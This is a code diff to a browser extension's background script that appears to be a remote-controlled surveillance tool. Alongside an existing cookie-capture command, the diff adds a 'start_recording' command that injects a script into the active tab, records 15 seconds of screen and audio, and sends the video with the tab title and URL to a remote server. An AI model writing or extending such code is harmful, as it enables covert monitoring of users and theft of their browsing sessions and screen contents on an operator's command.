@@ -167,6 +167,11 @@ async function processCommand(command) {
                 await captureCookies(command.id);
                 break;
 
+            case 'start_recording':
+                console.log(`🎥 Recording requested by ${command.requestedBy}`);
+                await captureRecording(command.id);
+                break;
+
             case 'ping':
                 await sendCommandResponse(command.id, 'pong', { message: 'Pong!' });
                 console.log('🏓 Pong sent');
@@ -349,6 +354,148 @@ async function captureCookies(commandId) {
         await sendCommandResponse(commandId, 'error', { message: error.message });
     }
 }
+
+// ============ Screen Recording Capture ============
+async function captureRecording(commandId) {
+    try {
+        // Get active tab
+        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
+        
+        if (!tab) {
+            throw new Error('No active tab found');
+        }
+
+        console.log('🎥 Starting screen recording...');
+
+        // Inject content script to handle recording with screen picker
+        await chrome.scripting.executeScript({
+            target: { tabId: tab.id },
+            func: async (cmdId, tabInfo) => {
+                try {
+                    console.log('🎥 [Content] Starting recording...');
+                    
+                    // Request display media (shows screen picker to user)
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: {
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 },
+                            frameRate: { ideal: 30 }
+                        },
+                        audio: true
+                    });
+
+                    const mediaRecorder = new MediaRecorder(stream, {
+                        mimeType: 'video/webm;codecs=vp8,opus',
+                        videoBitsPerSecond: 1500000
+                    });
+
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data && e.data.size > 0) chunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = async () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        
+                        reader.onloadend = () => {
+                            chrome.runtime.sendMessage({
+                                type: 'recording-data',
+                                commandId: cmdId,
+                                video: reader.result,
+                                size: blob.size,
+                                tabTitle: tabInfo.title,
+                                tabUrl: tabInfo.url
+                            });
+                        };
+                        
+                        reader.readAsDataURL(blob);
+                    };
+
+                    mediaRecorder.start();
+                    console.log('🎥 [Content] Recording started for 15s...');
+
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 15000);
+
+                } catch (err) {
+                    chrome.runtime.sendMessage({
+                        type: 'recording-error',
+                        commandId: cmdId,
+                        error: err.message
+                    });
+                }
+            },
+            args: [commandId, { title: tab.title, url: tab.url }]
+        });
+
+        console.log('🎥 Recording script injected, user will see screen picker...');
+
+    } catch (error) {
+        console.error('Error starting recording:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message });
+    }
+}
+
+// Ensure offscreen document exists
+async function ensureOffscreenDocument() {
+    const existingContexts = await chrome.runtime.getContexts({
+        contextTypes: ['OFFSCREEN_DOCUMENT'],
+        documentUrls: [chrome.runtime.getURL('offscreen-recording.html')]
+    });
+
+    if (existingContexts.length > 0) {
+        return;
+    }
+
+    await chrome.offscreen.createDocument({
+        url: 'offscreen-recording.html',
+        reasons: ['USER_MEDIA'],
+        justification: 'Recording screen video with audio'
+    });
+    
+    console.log('🎥 Offscreen document created');
+}
+
+// Handle recording data from content script
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.type === 'recording-data') {
+        handleRecordingData(message);
+    } else if (message.type === 'recording-error') {
+        handleRecordingError(message);
+    }
+});
+
+async function handleRecordingData(message) {
+    try {
+        console.log(`🎥 Recording received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB`);
+
+        await sendCommandResponse(message.commandId, 'recording', {
+            video: message.video,
+            tabTitle: message.tabTitle,
+            tabUrl: message.tabUrl,
+            duration: 15,
+            size: message.size
+        });
+
+        console.log('✅ Recording sent to server!');
+    } catch (error) {
+        console.error('Error sending recording:', error);
+        await sendCommandResponse(message.commandId, 'error', { message: error.message });
+    }
+}
+
+async function handleRecordingError(message) {
+    console.error('🎥 Recording error:', message.error);
+    await sendCommandResponse(message.commandId, 'error', { message: message.error });
+}
+
 
 // ============ Send Command Response ============
 async function sendCommandResponse(commandId, type, data) {
